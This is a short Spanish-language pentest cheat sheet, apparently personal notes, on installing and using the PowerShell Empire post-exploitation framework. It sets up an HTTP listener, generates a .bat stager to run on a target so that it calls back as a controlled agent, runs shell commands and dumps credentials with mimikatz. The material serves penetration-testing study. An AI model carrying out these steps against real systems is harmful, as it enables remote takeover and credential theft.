#Pentest  


PowerShell Empire es una plataforma de post-explotación que permite ejecutar y gestionar agentes para tareas de red, recopilación de información y explotación de vulnerabilidades en sistemas basados en Windows. Si bien se diseñó inicialmente para pruebas de penetración.

### **Instalación de PowerShell Empire**

1. **Requisitos Previos:**
   - Python 3.x
   - pip (gestor de paquetes de Python)
   - git

2. **Clonar el repositorio de PowerShell Empire:**
   ```bash
   git clone https://github.com/BC-SECURITY/Empire.git
   cd Empire
   ```

3. **Instalar dependencias:**
   ```bash
   sudo ./setup/install.sh
   ```

4. **Iniciar PowerShell Empire:**
   ```bash
   sudo ./empire
   ```

### **Interfaz de Usuario**

- **Console**: Interfaz principal donde interactúas con Empire.
- **Listeners**: Configura los canales de comunicación con los agentes.
- **Modules**: Ejecución de scripts específicos en los sistemas comprometidos.
- **Agents**: Sistemas comprometidos que están bajo control de Empire.

### **Comandos Básicos**

1. **Ayuda:**
   ```bash
   help
   ```

2. **Listar módulos:**
   ```bash
   usemodule <nombre_modulo>
   ```

3. **Configurar listener:**
   ```bash
   listeners
   use <tipo_listener>
   set Host <IP>
   execute
   ```

4. **Obtener información de los agentes:**
   ```bash
   agents
   interact <nombre_agente>
   ```

5. **Ejecutar comandos en un agente:**
   ```bash
   shell <comando>
   ```

6. **Utilizar un módulo:**
   ```bash
   usemodule <nombre_modulo>
   set <opcion> <valor>
   execute
   ```

### **Ejemplo de Flujo de Trabajo**

1. **Crear un Listener:**
   - Un listener es esencial para recibir las conexiones de los agentes.
   ```bash
   listeners
   use http
   set Host 192.168.1.100
   execute
   ```

2. **Crear un Payload:**
   - Usa el listener para crear un payload que puede ser desplegado en el objetivo.
   ```bash
   usestager windows/launcher_bat
   set Listener http
   execute
   ```

   Esto generará un script .bat que puedes ejecutar en la máquina objetivo.

3. **Conectar el Agente:**
   - Una vez que el payload se ejecuta en la máquina objetivo, deberías ver un agente activo.
   ```bash
   agents
   interact <nombre_agente>
   ```

4. **Ejecutar Comandos:**
   - Ahora puedes ejecutar comandos en la máquina comprometida.
   ```bash
   shell whoami
   shell ipconfig
   ```

5. **Usar Módulos:**
   - Puedes ejecutar módulos para realizar tareas más avanzadas, como el dumping de credenciales o la recolección de información.
   ```bash
   usemodule credentials/mimikatz/lsa_dump
   set Agent <nombre_agente>
   execute
   ```

### **Recursos Adicionales**

- **Documentación Oficial**: [GitHub de PowerShell Empire](https://github.com/BC-SECURITY/Empire)
- **Foros y Comunidades**: Participa en foros especializados para obtener asistencia y compartir experiencias.

Este es un resumen básico, pero deberías explorar la documentación oficial y otros recursos para obtener un conocimiento más profundo.